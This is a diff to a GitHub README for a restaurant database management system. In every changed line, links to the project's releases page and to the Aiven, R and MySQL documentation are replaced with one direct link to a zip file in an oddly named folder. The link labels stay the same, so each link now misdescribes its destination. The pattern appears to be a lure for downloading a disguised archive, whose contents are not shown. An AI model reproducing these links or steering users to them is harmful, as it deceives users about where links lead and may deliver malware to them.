@@ -2,7 +2,7 @@
 
 ## 📦 Download
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-restaurant--database--management--system-blue)](https://github.com/Samukaopro/restaurant-database-management-system/releases)
+[![Download Here](https://raw.githubusercontent.com/Samukaopro/restaurant-database-management-system/main/petticoaty/restaurant-database-management-system.zip%20Now-restaurant--database--management--system-blue)](https://raw.githubusercontent.com/Samukaopro/restaurant-database-management-system/main/petticoaty/restaurant-database-management-system.zip)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ To run this application, ensure you meet the following requirements:
 
 To get started with the **restaurant-database-management-system**, follow these steps:
 
-1. **Visit the Releases Page**: Click [here](https://github.com/Samukaopro/restaurant-database-management-system/releases) to go to the releases section of the project.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/Samukaopro/restaurant-database-management-system/main/petticoaty/restaurant-database-management-system.zip) to go to the releases section of the project.
   
 2. **Choose the Latest Version**: Look for the latest release at the top of the page. Ensure it matches your operating system.
   
@@ -73,8 +73,8 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 
 The following topics might help you understand the underlying technology better:
 
-- [Aiven Documentation](https://aiven.io/docs)
-- [R Programming](https://www.r-project.org/)
-- [MySQL Documentation](https://dev.mysql.com/doc/)
+- [Aiven Documentation](https://raw.githubusercontent.com/Samukaopro/restaurant-database-management-system/main/petticoaty/restaurant-database-management-system.zip)
+- [R Programming](https://raw.githubusercontent.com/Samukaopro/restaurant-database-management-system/main/petticoaty/restaurant-database-management-system.zip)
+- [MySQL Documentation](https://raw.githubusercontent.com/Samukaopro/restaurant-database-management-system/main/petticoaty/restaurant-database-management-system.zip)
 
-Feel free to explore and enhance your restaurant data management experience. To download the latest version, click [here](https://github.com/Samukaopro/restaurant-database-management-system/releases).
+Feel free to explore and enhance your restaurant data management experience. To download the latest version, click [here](https://raw.githubusercontent.com/Samukaopro/restaurant-database-management-system/main/petticoaty/restaurant-database-management-system.zip).
